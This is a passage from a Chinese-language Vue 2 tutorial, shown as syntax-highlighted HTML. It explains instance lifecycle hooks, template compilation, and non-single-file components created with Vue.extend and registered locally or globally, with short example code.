class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>分析生命周期<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;root&quot;</span> <span class="hljs-attr">:x</span>=<span class="hljs-string">&quot;n&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">v-text</span>=<span class="hljs-string">&quot;n&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>当前的n值是：&#123;&#123; n &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;add&quot;</span>&gt;</span>点我n+1<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;bye&quot;</span>&gt;</span>点我销毁vm<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-title class_">Vue</span>.<span class="hljs-property">config</span>.<span class="hljs-property">productionTip</span> = <span class="hljs-literal">false</span></span><br><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript"><span class="hljs-attr">el</span>: <span class="hljs-string">&#x27;#root&#x27;</span>,</span><br><span class="language-javascript"><span class="hljs-comment">// template:`</span></span><br><span class="language-javascript"><span class="hljs-comment">// &lt;div&gt;</span></span><br><span class="language-javascript"><span class="hljs-comment">// &lt;h2&gt;当前的n值是：&#123;&#123;n&#125;&#125;&lt;/h2&gt;</span></span><br><span class="language-javascript"><span class="hljs-comment">// &lt;button @click=&quot;add&quot;&gt;点我n+1&lt;/button&gt;</span></span><br><span class="language-javascript"><span class="hljs-comment">// &lt;/div&gt;</span></span><br><span class="language-javascript"><span class="hljs-comment">// `,</span></span><br><span class="language-javascript"><span class="hljs-attr">data</span>: &#123;</span><br><span class="language-javascript"><span class="hljs-attr">n</span>: <span class="hljs-number">1</span></span><br><span class="language-javascript">&#125;,</span><br><span class="language-javascript"><span class="hljs-attr">methods</span>: &#123;</span><br><span class="language-javascript"><span class="hljs-title function_">add</span>(<span class="hljs-params"></span>) &#123; <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;add&#x27;</span>)</span><br><span class="language-javascript"><span class="hljs-variable language_">this</span>.<span class="hljs-property">n</span>++</span><br><span class="language-javascript">&#125;,</span><br><span class="language-javascript"><span class="hljs-title function_">bye</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;bye&#x27;</span>)</span><br><span class="language-javascript"><span class="hljs-variable language_">this</span>.$destroy()</span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript">&#125;,</span><br><span class="language-javascript"><span class="hljs-attr">watch</span>: &#123;</span><br><span class="language-javascript"><span class="hljs-title function_">n</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;n变了&#x27;</span>)</span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript">&#125;,</span><br><span class="language-javascript"><span class="hljs-title function_">beforeCreate</span>(<span class="hljs-params"></span>) &#123;<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;beforeCreate&#x27;</span>)&#125;,</span><br><span class="language-javascript"><span class="hljs-title function_">created</span>(<span class="hljs-params"></span>) &#123;<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;created&#x27;</span>)&#125;,</span><br><span class="language-javascript"><span class="hljs-title function_">beforeMount</span>(<span class="hljs-params"></span>) &#123;<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;beforeMount&#x27;</span>)&#125;,</span><br><span class="language-javascript"><span class="hljs-title function_">mounted</span>(<span class="hljs-params"></span>) &#123;<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;mounted&#x27;</span>)&#125;,</span><br><span class="language-javascript"><span class="hljs-title function_">beforeUpdate</span>(<span class="hljs-params"></span>) &#123;<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;beforeUpdate&#x27;</span>)&#125;,</span><br><span class="language-javascript"><span class="hljs-title function_">updated</span>(<span class="hljs-params"></span>) &#123;<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;updated&#x27;</span>)&#125;,</span><br><span class="language-javascript"><span class="hljs-title function_">beforeDestroy</span>(<span class="hljs-params"></span>) &#123;<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;beforeDestroy&#x27;</span>)&#125;,</span><br><span class="language-javascript"><span class="hljs-title function_">destroyed</span>(<span class="hljs-params"></span>) &#123;<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;destroyed&#x27;</span>)&#125;,</span><br><span class="language-javascript">&#125;)</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure></li></ol><blockquote><p>来讲一下图中间大框框的内容</p></blockquote><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221124120324744.png" alt="image-20221124120324744"></p><p>先判断有没有 <strong>el</strong> 这个配置项，没有就调用 vm.$mount(el)，如果两个都没有就一直卡着，显示的界面就是最原始的容器的界面。有 <strong>el</strong>这个配置项，就进行判断有没有 template 这个配置项，没有 template 就将 el 绑定的容器编译为 vue 模板，来个对比图。</p><p>没编译前的：</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221124120402534.png" alt="image-20221124120402534"></p><p>编译后：</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221124120418648.png" alt="image-20221124120418648"></p><p>这个 template 有啥用咧？</p><p><strong>第一种情况 ，有 template：</strong></p><p>如果 el 绑定的容器没有任何内容，就一个空壳子，但在 Vue 实例中写了 template，就会编译解析这个 template 里的内容，生成虚拟DOM，最后将 虚拟 DOM 转为 真实 DOM 插入页面（其实就可以理解为 template 替代了 el 绑定的容器的内容）。</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221113222324448.png" alt="image-20221113222324448"></p><p>发现&#x3D;&#x3D;id为root&#x3D;&#x3D;的div元素整个被替换</p><p><strong>第二种情况 ，没有 template：</strong></p><p>没有 template，就编译解析 el 绑定的容器，生成虚拟 DOM，后面就顺着生命周期执行下去。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>常用的生命周期钩子</p><ul><li><p>amounted发送ajax请求、启动定时器、绑定自定义事件、订阅消息等初始化操作 </p></li><li><p>bbeforeDestroy清除定时器、解绑自定义事件、取消订阅消息等收尾工作</p></li></ul><p>关于销毁Vue实例</p><ul><li><p>销毁后借助Vue开发者工具看不到任何信息</p></li><li><p>销毁后自定义事件会失效，但原生DOM事件依然有效</p></li><li><p>一般不会在beforeDestroy操作数据，因为即便操作数据，也不会再触发更新流程了</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>引出生命周期<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">:style</span>=<span class="hljs-string">&quot;&#123;opacity&#125;&quot;</span>&gt;</span>欢迎学习Vue<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;opacity = 1&quot;</span>&gt;</span>透明度设置为1<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;stop&quot;</span>&gt;</span>点我停止变换<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-title class_">Vue</span>.<span class="hljs-property">config</span>.<span class="hljs-property">productionTip</span> = <span class="hljs-literal">false</span></span><br><span class="language-javascript">  <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript">    <span class="hljs-attr">el</span>: <span class="hljs-string">&#x27;#root&#x27;</span>,</span><br><span class="language-javascript">    <span class="hljs-attr">data</span>: &#123;</span><br><span class="language-javascript">      <span class="hljs-attr">opacity</span>: <span class="hljs-number">1</span></span><br><span class="language-javascript">    &#125;,</span><br><span class="language-javascript">    <span class="hljs-attr">methods</span>: &#123;</span><br><span class="language-javascript">      <span class="hljs-title function_">stop</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">        <span class="hljs-variable language_">this</span>.$destroy()</span><br><span class="language-javascript">      &#125;</span><br><span class="language-javascript">    &#125;,</span><br><span class="language-javascript">    <span class="hljs-comment">// Vue完成模板的解析并把初始的真实DOM元素放入页面后（挂载完毕）调用mounted</span></span><br><span class="language-javascript">    <span class="hljs-title function_">mounted</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;mounted&#x27;</span>, <span class="hljs-variable language_">this</span>)</span><br><span class="language-javascript">      <span class="hljs-variable language_">this</span>.<span class="hljs-property">timer</span> = <span class="hljs-built_in">setInterval</span>(<span class="hljs-function">() =&gt;</span> &#123;</span><br><span class="language-javascript">        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;setInterval&#x27;</span>)</span><br><span class="language-javascript">        <span class="hljs-variable language_">this</span>.<span class="hljs-property">opacity</span> -= <span class="hljs-number">0.01</span></span><br><span class="language-javascript">        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">opacity</span> &lt;= <span class="hljs-number">0</span>) <span class="hljs-variable language_">this</span>.<span class="hljs-property">opacity</span> = <span class="hljs-number">1</span></span><br><span class="language-javascript">      &#125;, <span class="hljs-number">16</span>)</span><br><span class="language-javascript">    &#125;,</span><br><span class="language-javascript">    <span class="hljs-title function_">beforeDestroy</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">      <span class="hljs-built_in">clearInterval</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">timer</span>)</span><br><span class="language-javascript">      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;vm即将驾鹤西游了&#x27;</span>)</span><br><span class="language-javascript">    &#125;,</span><br><span class="language-javascript">  &#125;)</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure></li></ul><h2 id="1-20组件化编程"><a href="#1-20组件化编程" class="headerlink" title="1.20组件化编程"></a>1.20组件化编程</h2><h3 id="模块与组件、模块化与组件化"><a href="#模块与组件、模块化与组件化" class="headerlink" title="模块与组件、模块化与组件化"></a>模块与组件、模块化与组件化</h3><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image(2).png" alt="image(2)"></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image(3).png" alt="image(3)"></p><ol><li><p>模块</p><ul><li><p>理解：向外提供特定功能的 js 程序，一般就是一个 js 文件</p></li><li><p>为什么：js 文件很多很复杂</p></li><li><p>作用：复用、简化 js 的编写，提高 js 运行效率</p></li></ul></li><li><p>组件</p><ul><li><p>定义：用来实现局部功能的代码和资源的集合（html&#x2F;css&#x2F;js&#x2F;image…） </p></li><li><p>为什么：一个界面的功能很复杂 </p></li><li><p>作用：复用编码，简化项目编码，提高运行效率</p></li></ul></li><li><p>模块化</p><ul><li>当应用中的 js 都以模块来编写的，那这个应用就是一个模块化的应用</li></ul></li><li><p>组件化</p><ul><li>当应用中的功能都是多组件的方式来编写的，那这个应用就是一个组件化的应用</li></ul></li></ol><h3 id="非单文件组件"><a href="#非单文件组件" class="headerlink" title="非单文件组件"></a>非单文件组件</h3><p>一个文件中只包含有 1 个组件</p><h4 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h4><p>Vue中使用组件的三大步骤：</p><ul><li>定义组件(创建组件)</li><li>注册组件</li><li>使用组件(写组件标签)</li></ul><p><strong>定义组件</strong></p><p>使用Vue.extend(options)创建，其中options和new Vue(options)时传入的那个options几乎一样，但也有点区别；</p><p>区别如下：</p><ul><li>el不要写，为什么？ ——— 最终所有的组件都要经过一个vm的管理，由vm中的el决定服务哪个容器。</li><li>data必须写成函数，为什么？ ———— 避免组件被复用时，数据存在引用关系。</li></ul><p>讲解一下面试小问题：data必须写成函数：</p><p>这是 js 底层设计的原因：举个例子</p><blockquote><p>对象形式</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> data = &#123;<br>    <span class="hljs-attr">a</span>: <span class="hljs-number">99</span>,<br>    <span class="hljs-attr">b</span>: <span class="hljs-number">100</span><br>&#125;<br><br><span class="hljs-keyword">let</span> x = data;<br><span class="hljs-keyword">let</span> y = data;<br><span class="hljs-comment">// x 和 y 引用的都是同一个对象，修改 x 的值， y 的值也会改变</span><br>x.<span class="hljs-property">a</span> = <span class="hljs-number">66</span>;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">loh</span>(x); <span class="hljs-comment">// a:66 b:100</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(y); <span class="hljs-comment">// a:66 b:100</span><br></code></pre></td></tr></table></figure><blockquote><p>函数形式</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">data</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> &#123;<br>        <span class="hljs-attr">a</span>: <span class="hljs-number">99</span>,<br>        <span class="hljs-attr">b</span>: <span class="hljs-number">100</span><br>    &#125;<br>&#125;<br><span class="hljs-keyword">let</span> x = <span class="hljs-title function_">data</span>();<br><span class="hljs-keyword">let</span> y = <span class="hljs-title function_">data</span>();<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(x === y); <span class="hljs-comment">// false</span><br><span class="hljs-comment">// 我的理解是函数每调用一次就创建一个新的对象返回给他们</span><br></code></pre></td></tr></table></figure><blockquote><p>备注：使用template可以配置组件结构。</p></blockquote><p>创建一个组件案例：Vue.extend() 创建</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-handlebars"><span class="language-xml"></span></span><br><span class="language-xml"><span class="language-handlebars">    Vue.config.productionTip = false</span></span><br><span class="language-xml"><span class="language-handlebars"></span></span><br><span class="language-xml"><span class="language-handlebars">    //第一步：创建school组件</span></span><br><span class="language-xml"><span class="language-handlebars">    const school = Vue.extend(&#123;</span></span><br><span class="language-xml"><span class="language-handlebars">        template:`</span></span><br><span class="language-xml"><span class="language-handlebars"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;demo&quot;</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars"><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>学校名称：</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">schoolName</span>&#125;&#125;</span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars"><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>学校地址：</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">address</span>&#125;&#125;</span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;showName&quot;</span>&gt;</span>点我提示学校名<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">`,</span></span><br><span class="language-xml"><span class="language-handlebars">        // el:&#x27;#root&#x27;, //组件定义时，一定不要写el配置项，因为最终所有的组件都要被一个vm管理，由vm决定服务于哪个容器。</span></span><br><span class="language-xml"><span class="language-handlebars">        data()&#123;</span></span><br><span class="language-xml"><span class="language-handlebars">            return &#123;</span></span><br><span class="language-xml"><span class="language-handlebars">                schoolName:&#x27;尚硅谷&#x27;,</span></span><br><span class="language-xml"><span class="language-handlebars">                address:&#x27;北京昌平&#x27;</span></span><br><span class="language-xml"><span class="language-handlebars">            &#125;</span></span><br><span class="language-xml"><span class="language-handlebars">        &#125;,</span></span><br><span class="language-xml"><span class="language-handlebars">        methods: &#123;</span></span><br><span class="language-xml"><span class="language-handlebars">            showName()&#123;</span></span><br><span class="language-xml"><span class="language-handlebars">                alert(this.schoolName)</span></span><br><span class="language-xml"><span class="language-handlebars">            &#125;</span></span><br><span class="language-xml"><span class="language-handlebars">        &#125;,</span></span><br><span class="language-xml"><span class="language-handlebars">    &#125;)</span></span><br><span class="language-xml"><span class="language-handlebars"></span></span><br><span class="language-xml"><span class="language-handlebars">    //第一步：创建student组件</span></span><br><span class="language-xml"><span class="language-handlebars">    const student = Vue.extend(&#123;</span></span><br><span class="language-xml"><span class="language-handlebars">        template:`</span></span><br><span class="language-xml"><span class="language-handlebars"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars"><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>学生姓名：</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">studentName</span>&#125;&#125;</span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars"><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>学生年龄：</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">age</span>&#125;&#125;</span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">`,</span></span><br><span class="language-xml"><span class="language-handlebars">        data()&#123;</span></span><br><span class="language-xml"><span class="language-handlebars">            return &#123;</span></span><br><span class="language-xml"><span class="language-handlebars">                studentName:&#x27;张三&#x27;,</span></span><br><span class="language-xml"><span class="language-handlebars">                age:18</span></span><br><span class="language-xml"><span class="language-handlebars">            &#125;</span></span><br><span class="language-xml"><span class="language-handlebars">        &#125;</span></span><br><span class="language-xml"><span class="language-handlebars">    &#125;)</span></span><br><span class="language-xml"><span class="language-handlebars"></span></span><br><span class="language-xml"><span class="language-handlebars">    //第一步：创建hello组件</span></span><br><span class="language-xml"><span class="language-handlebars">    const hello = Vue.extend(&#123;</span></span><br><span class="language-xml"><span class="language-handlebars">        template:`</span></span><br><span class="language-xml"><span class="language-handlebars"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars"><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>你好啊！</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">name</span>&#125;&#125;</span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">`,</span></span><br><span class="language-xml"><span class="language-handlebars">        data()&#123;</span></span><br><span class="language-xml"><span class="language-handlebars">            return &#123;</span></span><br><span class="language-xml"><span class="language-handlebars">                name:&#x27;Tom&#x27;</span></span><br><span class="language-xml"><span class="language-handlebars">            &#125;</span></span><br><span class="language-xml"><span class="language-handlebars">        &#125;</span></span><br><span class="language-xml"><span class="language-handlebars">    &#125;)</span></span><br><span class="language-xml"><span class="language-handlebars"></span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p><strong>注册组件</strong></p><ul><li>局部注册：靠new Vue的时候传入components选项</li><li>全局注册：靠Vue.component(‘组件名’,组件)</li></ul><blockquote><p>局部注册</p></blockquote><pre><code class="hljs">&lt;script&gt;    //创建vm    new Vue(&#123;        el: &#39;#root&#39;,        data: &#123;            msg:&#39;你好啊！&#39;        &#125;,        //第二步：注册组件（局部注册）        components: &#123;            school: school,            student: student            // ES6简写形式            // school,            // student        &#125;    &#125;)&lt;/script&gt;</code></pre><blockquote><p>全局注册</p></blockquote><pre><code class="hljs">&lt;script&gt;    //第二步：全局注册组件    Vue.component(&#39;hello&#39;, hello)&lt;/script&gt;</code></pre><p><strong>写组件标签</strong></p>   <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!-- 准备好一个容器--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">hello</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">hello</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">hr</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>&#123;&#123;msg&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">hr</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- 第三步：编写组件标签 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">school</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">school</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">hr</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- 第三步：编写组件标签 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">student</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">student</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p>全部代码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span><br>        <span 